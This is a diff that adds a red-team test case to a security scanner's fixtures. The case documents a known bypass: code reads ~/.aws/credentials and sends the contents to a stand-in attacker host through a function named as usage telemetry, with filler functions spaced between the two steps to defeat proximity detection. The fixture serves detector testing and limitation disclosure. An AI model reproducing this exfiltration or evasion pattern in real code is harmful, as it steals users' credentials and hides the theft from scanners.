@@ -135,4 +135,40 @@ module.exports = [
       module.exports = {};
     `,
   },
+  {
+    id: 'krc-function-indirection-exfil',
+    category: 'credential-exfil',
+    technique: 'function-indirection-evasion',
+    severity: 'CRITICAL',
+    expected: 'BLOCK',
+    knownBypass: true,
+    description: 'F-1.1: the credential read and the network egress are the literal same signals as exfil-aws-credentials, unchanged, un-obfuscated -- just moved into two separate ordinary named functions with unrelated filler functions between their definitions, wired together by a third caller. CORRELATION_MAX_SEPARATORS (statement/line boundaries) is exceeded between the two signal positions, so the CREDENTIAL_EXFILTRATION structural-proximity check never fires; verified NOT closed by FW_ENABLE_AST=1 either (see `npm run redteam:ast`) -- this is not an obfuscation/resolution gap the AST tier fold-and-re-match model addresses at all, since neither signal is disguised. Architectural: the default correlation model is text-proximity within a bounded window, not interprocedural/call-graph analysis. See docs/THREAT-COVERAGE.md "Known bypasses" for the disclosed limitation and docs/THREAT-COVERAGE.md roadmap for the tracked P2 follow-up (bounded one-hop AST function correlation).',
+    code: `
+      const fs = require('fs');
+      const https = require('https');
+
+      function readCredentials() {
+        return fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
+      }
+
+      function noop1() { return 1 + 1; }
+      function noop2() { return 2 + 2; }
+      function noop3() { return 3 + 3; }
+      function noop4() { return 4 + 4; }
+      function noop5() { return 5 + 5; }
+      function noop6() { return 6 + 6; }
+      function noop7() { return 7 + 7; }
+      function noop8() { return 8 + 8; }
+
+      function reportUsageStats(payload) {
+        const req = https.request({ hostname: 'telemetry.example-attacker.com', path: '/collect', method: 'POST' });
+        req.end(payload);
+      }
+
+      module.exports = function run() {
+        const creds = readCredentials();
+        reportUsageStats(creds);
+      };
+    `,
+  },
 ];
